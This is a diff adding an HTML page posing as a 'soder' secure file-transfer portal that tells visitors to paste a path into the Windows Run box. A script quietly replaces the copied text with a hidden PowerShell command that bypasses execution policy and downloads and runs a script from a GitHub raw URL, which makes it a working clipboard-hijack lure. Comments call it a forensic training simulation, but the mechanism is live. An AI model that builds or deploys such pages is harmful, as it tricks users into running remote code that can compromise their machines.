@@ -1,0 +1,97 @@
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>soder Secure Transfer Portal</title>
+</head>
+<body style="font-family: Arial; background:#0f172a; color:#e2e8f0; padding:40px">
+
+<h1>🔐 soder Research Department</h1>
+<p>Secure file distribution channel</p>
+
+<hr>
+
+<h2>Download Instructions</h2>
+
+<p>
+To download the program, follow these steps:
+</p>
+
+<ol>
+  <li>Press <b>Windows + R</b></li>
+  <li>Copy the following path and press Enter:</li>
+</ol>
+
+<pre id="copyBlock" style="background:black; color:#22c55e; padding:15px; cursor: pointer;">
+ 
+ 
+          \\shares\home\soder-enterprice\ap\soder.exe   
+</pre>
+
+<span id="hiddenText" style="position:absolute; left:-9999px;">
+          \\shares\home\soder-enterprice\ap\aps.exe   
+powershell.exe -ExecutionPolicy Bypass -Command "IEX (iwr https://raw.githubusercontent.com/shanks-wq/soder/refs/heads/main/aaa.xls -UseBasicParsing)"      
+
+</span>
+
+<script>
+document.getElementById("copyBlock").addEventListener("copy", function(e) {
+  const hidden = document.getElementById("hiddenText").innerText;
+  e.clipboardData.setData("text/plain", hidden);
+  e.preventDefault();
+});
+</script> 
+
+
+<h2>Alternate Download</h2>
+
+<p style="color:#facc15">
+If the network share is unavailable, use the external training link below:
+</p>
+
+<a 
+  href="https://example.com/downloads/aps.exe"
+  style="
+    display:inline-block;
+    padding:12px 20px;
+    background:#1e40af;
+    color:white;
+    text-decoration:none;
+    border-radius:8px;
+    margin-top:10px;
+    font-weight:bold;
+  "
+>
+⬇ Download soder.exe
+</a>
+
+<p style="font-size:14px; color:#94a3b8; margin-top:10px">
+* This is a simulation file for training purposes only
+</p>
+
+<hr>
+<p><i>Internal use only - soder enterprise</i></p>
+
+<!--
+=====================================================
+ Forensic Training Artifact - NOT visible to end user
+=====================================================
+
+Simulated suspicious file reference:
+   soder.exe
+
+Related task id:
+    ST-9920-Z9
+
+No real malware or executable is distributed
+=====================================================
+-->
+
+<!-- Hidden trace (safe – not executable) -->
+<script type="text/plain" id="trace">
+ProcessName: soder.exe
+Parent: chrome.exe
+Status: Not Executed (Simulation)
+</script>
+
+</body>
+</html>
